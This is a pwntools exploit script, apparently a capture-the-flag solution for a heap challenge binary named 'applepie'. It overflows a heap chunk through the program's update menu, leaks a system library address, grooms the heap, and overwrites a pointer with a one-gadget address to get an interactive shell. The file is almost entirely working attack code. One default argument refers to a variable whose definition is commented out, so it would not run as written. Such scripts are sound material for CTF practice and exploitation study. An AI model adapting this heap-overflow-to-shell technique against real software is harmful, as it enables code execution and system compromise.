#!/usr/bin/env python3
from pwn import *

context(terminal=['tmux', 'splitw', '-h'])  # horizontal split window
# context(terminal=['tmux', 'new-window'])  # open new window

# libc = ELF('')
# elf = ELF('./applepie')
# context(os='linux', arch=elf.arch)
context(log_level='debug')  # output verbose log

RHOST = "localhost"
RPORT = 12345
LHOST = "127.0.0.1"
LPORT = 12345

def section_addr(name, elf=elf):
    return elf.get_section_by_name(name).header['sh_addr']

def dbg(ss):
    log.info("%s: 0x%x" % (ss, eval(ss)))

conn = None
opt = sys.argv.pop(1) if len(sys.argv) > 1 else '?'  # pop option
if opt in 'rl':
    conn = remote(*{'r': (RHOST, RPORT), 'l': (LHOST, LPORT)}[opt])
elif opt == 'd':
    gdbscript = """
    
    continue
    """.format(hex(elf.symbols['main'] if 'main' in elf.symbols.keys() else elf.entrypoint))
    conn = gdb.debug(['./applepie'], gdbscript=gdbscript)
else:
    conn = process(['./applepie'])
    # conn = process(['./applepie'], env={'LD_PRELOAD': ''})
    if opt == 'a': gdb.attach(conn)

# exploit
def add(size, name):
    conn.sendlineafter('Choice:', '1')
    conn.sendlineafter('Choice:', '2')
    conn.sendlineafter('Choice:', '2')
    conn.sendlineafter('Size:', str(size))
    conn.sendafter('Name', name)

def show(idx):
    conn.sendlineafter('Choice:', '2')
    conn.sendlineafter('Index:', str(idx))

def update(idx, size, name):
    conn.sendlineafter('Choice:', '3')
    conn.sendlineafter('Index:', str(idx))
    conn.sendlineafter('Choice:', '1')
    conn.sendlineafter('Choice:', '1')
    conn.sendlineafter('Size:', str(size))
    conn.sendafter('Name', name)

def delete(idx):
    conn.sendlineafter('Choice:', '4')
    conn.sendlineafter('Index:', str(idx))

log.info('Pwning')

add(0x100, 'x'*0x100)
add(0x100, 'y'*0x100)
# add(0x100, 'p'*0x100)
update(0, 0x100 + 0x18, b'z'*0x100 + p64(-17, sign='signed') + p64(1) + b'\n')
show(1)
conn.recvuntil('Style: ')
leak = u64(conn.recv(6) + b'\x00'*2)
dbg('leak')
libsystem_c_base = leak - 706164496
dbg('libsystem_c_base')
delete(1)
delete(0)


# free 0 free(name), free(info) 0x28, 0x28, consolidate
# free 1 free(name), free(info) 0x200, 0x28(mag)

add(0x200, 'b'*0x200)
add(0x100, 'c'*0x100)
delete(0)
add(0x1d0, 'd'*0x1d0)


one_gadget = libsystem_c_base + 0x0000000000023FE9
__exit_got = 0x2a1704f0 + libsystem_c_base
payload = b'x'*0x1d0 + p64(one_gadget) + p64((__exit_got) >> 4) + p32(0x3) + b'\n'
update(0, 0x1d0 + 0x18, payload)

conn.sendline('1')
conn.sendline('1')
conn.sendline('1')
conn.sendline('-1')
conn.interactive()
